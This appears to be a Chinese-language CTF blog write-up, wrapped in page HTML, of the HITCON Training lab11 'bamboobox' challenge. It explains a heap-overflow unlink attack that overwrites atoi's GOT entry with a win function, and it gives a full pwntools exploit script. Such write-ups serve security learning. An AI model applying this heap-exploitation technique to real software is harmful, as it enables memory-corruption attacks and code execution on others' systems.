@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>unlink例题-HITCON_Training_lab11-2 | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="unlink例题-HITCON_Training_lab11-2 写在前面
+HITCON_Training_lab11这道题有两种解法：
+因为是unlink的例题，所以这里只会说到unlink
+漏洞分析 漏洞点在修改item的函数中：change_item()
+通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。
+所以我们可以创建如下的堆结构来实现unlink：
+这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向&amp;chunk0 - 3的地方：
+free之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030
+free之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0
+在ida中我们可以看到这个地址在bss段上，还没有初始化。
+不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：
+这里我们将地址改为atoi的got表地址
+因为这时&amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。
+这里就可以看到，我们已经将atoi的got表修改成了magic。
+当然，也有方法可以直接拿到shell，不过这里就不多说了。
+#!/usr/bin/python3from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./bamboobox&#39;)def additem(length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;2&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def modify(idx,length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;3&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def remove(idx):p.recvuntil(&#34;:&#34;)p.sendline(&#34;4&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))def show():p.recvuntil(&#34;:&#34;)p.sendline(&#34;1&#34;)additem(0x40,&#34;a&#34;*8)#0additem(0x80,&#34;b&#34;*8)#1additem(0x40,&#34;c&#34;*8)#2chunk0_ptr = 0x6020C8fake_chunk = p64(0) &#43; p64(0x41) &#43; p64(chunk0_ptr - 0x18) &#43; p64(chunk0_ptr - 0x10) &#43; b&#39;a&#39;*0x20fake_chunk &#43;= p64(0x40) &#43; p64(0x90)modify(0 ,0x80, fake_chunk)remove(1)atoi = p64(0)*2 &#43; p64(0x20) &#43; p64(0x602068) #got.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="unlink例题-HITCON_Training_lab11-2" />
+<meta property="og:description" content="unlink例题-HITCON_Training_lab11-2 写在前面
+HITCON_Training_lab11这道题有两种解法：
+因为是unlink的例题，所以这里只会说到unlink
+漏洞分析 漏洞点在修改item的函数中：change_item()
+通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。
+所以我们可以创建如下的堆结构来实现unlink：
+这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向&amp;chunk0 - 3的地方：
+free之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030
+free之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0
+在ida中我们可以看到这个地址在bss段上，还没有初始化。
+不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：
+这里我们将地址改为atoi的got表地址
+因为这时&amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。
+这里就可以看到，我们已经将atoi的got表修改成了magic。
+当然，也有方法可以直接拿到shell，不过这里就不多说了。
+#!/usr/bin/python3from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./bamboobox&#39;)def additem(length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;2&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def modify(idx,length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;3&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def remove(idx):p.recvuntil(&#34;:&#34;)p.sendline(&#34;4&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))def show():p.recvuntil(&#34;:&#34;)p.sendline(&#34;1&#34;)additem(0x40,&#34;a&#34;*8)#0additem(0x80,&#34;b&#34;*8)#1additem(0x40,&#34;c&#34;*8)#2chunk0_ptr = 0x6020C8fake_chunk = p64(0) &#43; p64(0x41) &#43; p64(chunk0_ptr - 0x18) &#43; p64(chunk0_ptr - 0x10) &#43; b&#39;a&#39;*0x20fake_chunk &#43;= p64(0x40) &#43; p64(0x90)modify(0 ,0x80, fake_chunk)remove(1)atoi = p64(0)*2 &#43; p64(0x20) &#43; p64(0x602068) #got." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="unlink例题-HITCON_Training_lab11-2"/>
+<meta name="twitter:description" content="unlink例题-HITCON_Training_lab11-2 写在前面
+HITCON_Training_lab11这道题有两种解法：
+因为是unlink的例题，所以这里只会说到unlink
+漏洞分析 漏洞点在修改item的函数中：change_item()
+通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。
+所以我们可以创建如下的堆结构来实现unlink：
+这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向&amp;chunk0 - 3的地方：
+free之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030
+free之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0
+在ida中我们可以看到这个地址在bss段上，还没有初始化。
+不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：
+这里我们将地址改为atoi的got表地址
+因为这时&amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。
+这里就可以看到，我们已经将atoi的got表修改成了magic。
+当然，也有方法可以直接拿到shell，不过这里就不多说了。
+#!/usr/bin/python3from pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./bamboobox&#39;)def additem(length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;2&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def modify(idx,length,name):p.recvuntil(&#34;:&#34;)p.sendline(&#34;3&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))p.recvuntil(&#34;:&#34;)p.sendline(str(length))p.recvuntil(&#34;:&#34;)p.sendline(name)def remove(idx):p.recvuntil(&#34;:&#34;)p.sendline(&#34;4&#34;)p.recvuntil(&#34;:&#34;)p.sendline(str(idx))def show():p.recvuntil(&#34;:&#34;)p.sendline(&#34;1&#34;)additem(0x40,&#34;a&#34;*8)#0additem(0x80,&#34;b&#34;*8)#1additem(0x40,&#34;c&#34;*8)#2chunk0_ptr = 0x6020C8fake_chunk = p64(0) &#43; p64(0x41) &#43; p64(chunk0_ptr - 0x18) &#43; p64(chunk0_ptr - 0x10) &#43; b&#39;a&#39;*0x20fake_chunk &#43;= p64(0x40) &#43; p64(0x90)modify(0 ,0x80, fake_chunk)remove(1)atoi = p64(0)*2 &#43; p64(0x20) &#43; p64(0x602068) #got."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "unlink例题-HITCON_Training_lab11-2",
+      "item": "https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "unlink例题-HITCON_Training_lab11-2",
+  "name": "unlink例题-HITCON_Training_lab11-2",
+  "description": "unlink例题-HITCON_Training_lab11-2 写在前面\nHITCON_Training_lab11这道题有两种解法：\n因为是unlink的例题，所以这里只会说到unlink\n漏洞分析 漏洞点在修改item的函数中：change_item()\n通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。\n所以我们可以创建如下的堆结构来实现unlink：\n这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向\u0026amp;chunk0 - 3的地方：\nfree之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030\nfree之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0\n在ida中我们可以看到这个地址在bss段上，还没有初始化。\n不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：\n这里我们将地址改为atoi的got表地址\n因为这时\u0026amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。\n这里就可以看到，我们已经将atoi的got表修改成了magic。\n当然，也有方法可以直接拿到shell，不过这里就不多说了。\n#!/usr/bin/python3\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = process(\u0026#39;./bamboobox\u0026#39;)\rdef additem(length,name):\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(\u0026#34;2\u0026#34;)\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(str(length))\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(name)\rdef modify(idx,length,name):\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(\u0026#34;3\u0026#34;)\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(str(idx))\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(str(length))\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(name)\rdef remove(idx):\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(\u0026#34;4\u0026#34;)\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(str(idx))\rdef show():\rp.recvuntil(\u0026#34;:\u0026#34;)\rp.sendline(\u0026#34;1\u0026#34;)\radditem(0x40,\u0026#34;a\u0026#34;*8)#0\radditem(0x80,\u0026#34;b\u0026#34;*8)#1\radditem(0x40,\u0026#34;c\u0026#34;*8)#2\rchunk0_ptr = 0x6020C8\rfake_chunk = p64(0) + p64(0x41) + p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10) + b\u0026#39;a\u0026#39;*0x20\rfake_chunk += p64(0x40) + p64(0x90)\rmodify(0 ,0x80, fake_chunk)\rremove(1)\ratoi = p64(0)*2 + p64(0x20) + p64(0x602068) #got.",
+  "keywords": [
+    
+  ],
+  "articleBody": "unlink例题-HITCON_Training_lab11-2 写在前面\nHITCON_Training_lab11这道题有两种解法：\n因为是unlink的例题，所以这里只会说到unlink\n漏洞分析 漏洞点在修改item的函数中：change_item()\n通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。\n所以我们可以创建如下的堆结构来实现unlink：\n这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向\u0026chunk0 - 3的地方：\nfree之前，存放chunk0的地址为0x6020C8，chunk0的值为199e030\nfree之后，原本存放chunk0地址的0x6020C8就变成了0x6020C8 - 3*8 = 0x6020b0\n在ida中我们可以看到这个地址在bss段上，还没有初始化。\n不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：\n这里我们将地址改为atoi的got表地址\n因为这时\u0026chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。\n这里就可以看到，我们已经将atoi的got表修改成了magic。\n当然，也有方法可以直接拿到shell，不过这里就不多说了。\n#!/usr/bin/python3\rfrom pwn import *\rcontext.log_level = 'debug'\rp = process('./bamboobox')\rdef additem(length,name):\rp.recvuntil(\":\")\rp.sendline(\"2\")\rp.recvuntil(\":\")\rp.sendline(str(length))\rp.recvuntil(\":\")\rp.sendline(name)\rdef modify(idx,length,name):\rp.recvuntil(\":\")\rp.sendline(\"3\")\rp.recvuntil(\":\")\rp.sendline(str(idx))\rp.recvuntil(\":\")\rp.sendline(str(length))\rp.recvuntil(\":\")\rp.sendline(name)\rdef remove(idx):\rp.recvuntil(\":\")\rp.sendline(\"4\")\rp.recvuntil(\":\")\rp.sendline(str(idx))\rdef show():\rp.recvuntil(\":\")\rp.sendline(\"1\")\radditem(0x40,\"a\"*8)#0\radditem(0x80,\"b\"*8)#1\radditem(0x40,\"c\"*8)#2\rchunk0_ptr = 0x6020C8\rfake_chunk = p64(0) + p64(0x41) + p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10) + b'a'*0x20\rfake_chunk += p64(0x40) + p64(0x90)\rmodify(0 ,0x80, fake_chunk)\rremove(1)\ratoi = p64(0)*2 + p64(0x20) + p64(0x602068) #got.['atoi']\rmodify(0, 0x40, atoi)\rmagic = 0x400D49\r# gdb.attach(p, 'b*0x400C05')\r# pause()\rmodify(0, 0x8, p64(magic))\rp.recvuntil(\":\")\rp.sendline(\" \")\rp.interactive() ",
+  "wordCount" : "118",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/unlink%E4%BE%8B%E9%A2%98-hitcon_training_lab11-2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/study" title="study">
+                    <span>study</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      unlink例题-HITCON_Training_lab11-2
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#unlink%e4%be%8b%e9%a2%98-hitcon_training_lab11-2" aria-label="unlink例题-HITCON_Training_lab11-2">unlink例题-HITCON_Training_lab11-2</a><ul>
+                        
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="unlink例题-hitcon_training_lab11-2">unlink例题-HITCON_Training_lab11-2<a hidden class="anchor" aria-hidden="true" href="#unlink例题-hitcon_training_lab11-2">#</a></h2>
+<p><strong>写在前面</strong></p>
+<p>HITCON_Training_lab11这道题有两种解法：</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116115808430.png" alt="image-20231116115808430"  />
+</p>
+<p>因为是unlink的例题，所以这里只会说到unlink</p>
+<h3 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h3>
+<p>漏洞点在修改item的函数中：<code>change_item()</code></p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116135714518.png" alt="image-20231116135714518"  />
+</p>
+<p>通过这个逻辑，可以看到虽然对输入的字符有限制，但是并没有检查输入的长度是否大于堆本来的长度。故这里存在堆溢出。</p>
+<p>所以我们可以创建如下的堆结构来实现unlink：</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116142727538.png" alt="image-20231116142727538"  />
+</p>
+<p>这时只要我们free掉chunk1，unlink就可以让chunk0的指针指向&amp;chunk0 - 3的地方：</p>
+<p>free之前，存放chunk0的地址为<code>0x6020C8</code>，chunk0的值为<code>199e030</code></p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116144525693.png" alt="image-20231116144525693"  />
+</p>
+<p>free之后，原本存放chunk0地址的<code>0x6020C8</code>就变成了<code>0x6020C8 - 3*8 = 0x6020b0</code></p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116144829739.png" alt="image-20231116144829739"  />
+</p>
+<p>在ida中我们可以看到这个地址在bss段上，还没有初始化。</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116145448423.png" alt="image-20231116145448423"  />
+</p>
+<p>不过因为这个地址在我们chunk0的上方，所以我们可以向下修改chunk0的指针：</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116150715499.png" alt="image-20231116150715499"  />
+</p>
+<p>这里我们将地址改为atoi的got表地址</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116150932130.png" alt="image-20231116150932130"  />
+</p>
+<p>因为这时&amp;chunk0已经指向了atoi的got表，所以这时我们再向chunk0中写入地址，就可以覆盖掉原有的atoi的got表。</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116152256993.png" alt="image-20231116152256993"  />
+</p>
+<p>这里就可以看到，我们已经将atoi的got表修改成了magic。</p>
+<p><img loading="lazy" src="/ctf/unlink-HITCON_Training_lab11-2.assets/image-20231116152401091.png" alt="image-20231116152401091"  />
+</p>
+<p>当然，也有方法可以直接拿到shell，不过这里就不多说了。</p>
+<pre tabindex="0"><code>#!/usr/bin/python3
+from pwn import *
+context.log_level = &#39;debug&#39;
+
+p = process(&#39;./bamboobox&#39;)
+
+def additem(length,name):
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(&#34;2&#34;)
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(str(length))
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(name)
+
+def modify(idx,length,name):
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(&#34;3&#34;)
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(str(idx))
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(str(length))
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(name)
+
+def remove(idx):
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(&#34;4&#34;)
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(str(idx))
+
+def show():
+    p.recvuntil(&#34;:&#34;)
+    p.sendline(&#34;1&#34;)
+    
+additem(0x40,&#34;a&#34;*8)#0
+additem(0x80,&#34;b&#34;*8)#1
+additem(0x40,&#34;c&#34;*8)#2
+
+chunk0_ptr = 0x6020C8
+fake_chunk = p64(0) + p64(0x41) + p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10) + b&#39;a&#39;*0x20
+fake_chunk += p64(0x40) + p64(0x90)
+
+modify(0 ,0x80, fake_chunk)
+
+remove(1)
+
+atoi = p64(0)*2 + p64(0x20) + p64(0x602068) #got.[&#39;atoi&#39;]
+modify(0, 0x40, atoi)
+
+magic = 0x400D49
+
+# gdb.attach(p, &#39;b*0x400C05&#39;)
+# pause()
+modify(0, 0x8, p64(magic))
+p.recvuntil(&#34;:&#34;)
+p.sendline(&#34; &#34;)
+p.interactive()
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/uaf%E4%BE%8B%E9%A2%98-hitcon_training_lab16/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>UAF例题-HITCON_Training_lab16</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/">
+    <span class="title">Next »</span>
+    <br>
+    <span>鹏城杯_2018_note</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
